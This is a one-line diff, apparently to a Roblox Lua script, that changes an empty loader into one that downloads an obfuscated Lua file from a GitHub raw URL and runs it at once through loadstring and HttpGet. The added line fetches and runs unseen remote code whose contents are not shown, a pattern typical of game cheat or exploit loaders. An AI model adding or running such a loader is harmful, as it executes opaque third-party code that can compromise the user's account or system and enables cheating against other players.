@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(""))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rgie2/lol/main/obf_bIpf78P2wCP282A19q83hRnPOIkeMo0ncOz8qs5h8142vgz47dz5i8S1w6D8vLAG.lua"))()
